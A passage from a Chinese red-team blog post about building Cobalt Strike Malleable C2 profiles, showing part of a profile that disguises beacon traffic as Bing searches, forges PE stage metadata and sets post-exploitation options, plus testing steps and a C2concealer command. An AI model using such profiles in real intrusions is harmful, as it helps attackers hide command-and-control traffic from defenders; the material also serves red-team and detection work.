&#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;go&quot; &quot;Search&quot;;</span><br><span class="line">        parameter &quot;qs&quot; &quot;bs&quot;;</span><br><span class="line">        parameter &quot;form&quot; &quot;QBRE&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private, max-age=0&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;&lt;html lang=\&quot;en\&quot; xml:lang=\&quot;en\&quot; xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot; xmlns:Web=\&quot;http://schemas.live.com/Web/\&quot;&gt;&lt;script type=\&quot;text/javascript\&quot;&gt;//&lt;![CDATA[si_ST=new Date;//]]&gt;&lt;/script&gt;&lt;head&gt;&lt;!--pc--&gt;&lt;title&gt;Bing&lt;/title&gt;&lt;meta content=\&quot;text/html; charset=utf-8\&quot; http-equiv=\&quot;content-type\&quot; /&gt;&lt;link href=\&quot;/search?format=rss&amp;amp;q=canary&amp;amp;go=Search&amp;amp;qs=bs&amp;amp;form=QBRE\&quot; rel=\&quot;alternate\&quot; title=\&quot;XML\&quot; type=\&quot;text/xml\&quot; /&gt;&lt;link href=\&quot;/search?format=rss&amp;amp;q=canary&amp;amp;go=Search&amp;amp;qs=bs&amp;amp;form=QBRE\&quot; rel=\&quot;alternate\&quot; title=\&quot;RSS\&quot; type=\&quot;application/rss+xml\&quot; /&gt;&lt;link href=\&quot;/sa/simg/bing_p_rr_teal_min.ico\&quot; rel=\&quot;shortcut icon\&quot; /&gt;&lt;script type=\&quot;text/javascript\&quot;&gt;//&lt;![CDATA[&quot;;</span><br><span class="line">            append &quot;G=&#123;ST:(si_ST?si_ST:new Date),Mkt:\&quot;en-US\&quot;,RTL:false,Ver:\&quot;53\&quot;,IG:\&quot;4C1158CCBAFC4896AD78ED0FF0F4A1B2\&quot;,EventID:\&quot;E37FA2E804B54C71B3E275E9589590F8\&quot;,MN:\&quot;SERP\&quot;,V:\&quot;web\&quot;,P:\&quot;SERP\&quot;,DA:\&quot;CO4\&quot;,SUIH:\&quot;OBJhNcrOC72Z3mr21coFQw\&quot;,gpUrl:\&quot;/fd/ls/GLinkPing.aspx?\&quot; &#125;; _G.lsUrl=\&quot;/fd/ls/l?IG=\&quot;+_G.IG ;curUrl=\&quot;http://www.bing.com/search\&quot;;function si_T(a)&#123; if(document.images)&#123;_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\&quot;IG=\&quot;+_G.IG+\&quot;&amp;\&quot;+a;&#125;return true;&#125;;//]]&gt;&lt;/script&gt;&lt;style type=\&quot;text/css\&quot;&gt;.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### HTTP-POST</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;/Search/&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;www.bing.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;DUP=Q=GpO1nJpMnam4UllEfmeMdg2&amp;T=283767088&amp;A=1&amp;IG&quot;; </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;q&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        parameter &quot;go&quot; &quot;Search&quot;;</span><br><span class="line">        parameter &quot;qs&quot; &quot;bs&quot;;</span><br><span class="line">        </span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;form&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private, max-age=0&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;&lt;html lang=\&quot;en\&quot; xml:lang=\&quot;en\&quot; xmlns=\&quot;http://www.w3.org/1999/xhtml\&quot; xmlns:Web=\&quot;http://schemas.live.com/Web/\&quot;&gt;&lt;script type=\&quot;text/javascript\&quot;&gt;//&lt;![CDATA[si_ST=new Date;//]]&gt;&lt;/script&gt;&lt;head&gt;&lt;!--pc--&gt;&lt;title&gt;Bing&lt;/title&gt;&lt;meta content=\&quot;text/html; charset=utf-8\&quot; http-equiv=\&quot;content-type\&quot; /&gt;&lt;link href=\&quot;/search?format=rss&amp;amp;q=canary&amp;amp;go=Search&amp;amp;qs=bs&amp;amp;form=QBRE\&quot; rel=\&quot;alternate\&quot; title=\&quot;XML\&quot; type=\&quot;text/xml\&quot; /&gt;&lt;link href=\&quot;/search?format=rss&amp;amp;q=canary&amp;amp;go=Search&amp;amp;qs=bs&amp;amp;form=QBRE\&quot; rel=\&quot;alternate\&quot; title=\&quot;RSS\&quot; type=\&quot;application/rss+xml\&quot; /&gt;&lt;link href=\&quot;/sa/simg/bing_p_rr_teal_min.ico\&quot; rel=\&quot;shortcut icon\&quot; /&gt;&lt;script type=\&quot;text/javascript\&quot;&gt;//&lt;![CDATA[&quot;;</span><br><span class="line">            append &quot;G=&#123;ST:(si_ST?si_ST:new Date),Mkt:\&quot;en-US\&quot;,RTL:false,Ver:\&quot;53\&quot;,IG:\&quot;4C1158CCBAFC4896AD78ED0FF0F4A1B2\&quot;,EventID:\&quot;E37FA2E804B54C71B3E275E9589590F8\&quot;,MN:\&quot;SERP\&quot;,V:\&quot;web\&quot;,P:\&quot;SERP\&quot;,DA:\&quot;CO4\&quot;,SUIH:\&quot;OBJhNcrOC72Z3mr21coFQw\&quot;,gpUrl:\&quot;/fd/ls/GLinkPing.aspx?\&quot; &#125;; _G.lsUrl=\&quot;/fd/ls/l?IG=\&quot;+_G.IG ;curUrl=\&quot;http://www.bing.com/search\&quot;;function si_T(a)&#123; if(document.images)&#123;_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\&quot;IG=\&quot;+_G.IG+\&quot;&amp;\&quot;+a;&#125;return true;&#125;;//]]&gt;&lt;/script&gt;&lt;style type=\&quot;text/css\&quot;&gt;.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### HTTP-stager </span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private, max-age=0&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/html; charset=utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;Accept-Encoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/8.5&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### Stage</span><br><span class="line"></span><br><span class="line">stage &#123;</span><br><span class="line">	set checksum       &quot;0&quot;;</span><br><span class="line">	set compile_time   &quot;12 Jun 2020 11:22:23&quot;;</span><br><span class="line">	set image_size_x86 &quot;559966&quot;;</span><br><span class="line">	set image_size_x64 &quot;559966&quot;;</span><br><span class="line">    set entry_point    &quot;38807&quot;;</span><br><span class="line">	set rich_header    &quot;\xcd\x11\x8f\xf8\x89\x70\xe1\xab\x89\x70\xe1\xab\x89\x70\xe1\xab\x3d\xec\x10\xab\x9c\x70\xe1\xab\x3d\xec\x12\xab\x0a\x70\xe1\xab\x3d\xec\x13\xab\x90\x70\xe1\xab\xea\x2d\xe2\xaa\x9b\x70\xe1\xab\xea\x2d\xe4\xaa\xae\x70\xe1\xab\xea\x2d\xe5\xaa\x9b\x70\xe1\xab\x80\x08\x72\xab\x82\x70\xe1\xab\x89\x70\xe0\xab\x03\x70\xe1\xab\xe7\x2d\xe4\xaa\x80\x70\xe1\xab\xe7\x2d\x1e\xab\x88\x70\xe1\xab\x89\x70\x76\xab\x88\x70\xe1\xab\xe7\x2d\xe3\xaa\x88\x70\xe1\xab\x52\x69\x63\x68\x89\x70\xe1\xab\x00\x00\x00\x00\x00\x00\x00\x00&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### Post-Exploitation</span><br><span class="line"></span><br><span class="line">post-ex &#123;</span><br><span class="line">    set amsi_disable &quot;false&quot;;   # Disable AMSI </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试通过</p>
+<p><img src="../images/malleable/14.png" alt="image"></p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试步骤</p>
+<ul>
+<li>启动wireshark</li>
+<li>使用测试配置文件启动teamserver</li>
+<li>创建HTTP监听器（名为http）</li>
+<li>创建SMB监听器（名为smb）</li>
+</ul>
+<p>然后进行操作，看是否符合要求。</p>
+<p><img src="../images/malleable/15.png" alt="image"></p>
+<h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>使用C2concealer自动化生成。用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C2concealer --hostname google.com --variant 3</span><br></pre></td></tr></table></figure>
+<p><img src="../images/malleable/16.png" alt="image"></p>
+<p>参考文章：</p>
+<p><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/" target="_blank" rel="noopener">https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/</a></p>
+<p><a href="https://www.zzhsec.com/544.html" target="_blank" rel="noopener">https://www.zzhsec.com/544.html</a></p>
+<p><a href="https://www.cobaltstrike.com/help-malleable-c2" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-malleable-c2</a></p>
+<p><a href="https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/" target="_blank" rel="noopener">https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/</a></p>
+<p><a href="https://xz.aliyun.com/t/2796" target="_blank" rel="noopener">https://xz.aliyun.com/t/2796</a></p>
+<p><a href="https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile" target="_blank" rel="noopener">https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile</a></p>
+<p><a href="https://fortynorthsecurity.com/blog/introducing-c2concealer/" target="_blank" rel="noopener">https://fortynorthsecurity.com/blog/introducing-c2concealer/</a></p>
+<p><a href="https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b" target="_blank" rel="noopener">https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b</a></p>
+<p><a href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c</a></p>
+<p><a href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.14.profile" target="_blank" rel="noopener">https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.3.14.profile</a></p>
+<p><a href="https://exp10it.cn//posts/69" target="_blank" rel="noopener">https://exp10it.cn//posts/69</a></p>
+<p><a href="https://www.cobaltstrike.com/help-malleable-postex" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-malleable-postex</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/malleable/">Malleable-C2-Profiles配置</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年09月02日 - 15:09</p>
+  <p><span>最后更新:</span>2020年09月02日 - 15:09</p>
+  <p><span>原始链接:</span><a href="/malleable/" title="Malleable-C2-Profiles配置">https://lengjibo.github.io/malleable/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/malleable/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/syscall/" rel="next" title="分离免杀+直接系统调用注入进程免杀">
+                <i class="fa fa-chevron-left"></i> 分离免杀+直接系统调用注入进程免杀
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">109</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">118</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sqlmap.wiki/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于Malleable-C2-Profiles"><span class="nav-number">1.</span> <span class="nav-text">关于Malleable-C2-Profiles</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#创建profile："><span class="nav-number">2.</span> <span class="nav-text">创建profile：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">3.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动化"><span class="nav-number">4.</span> <span class="nav-text">自动化</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
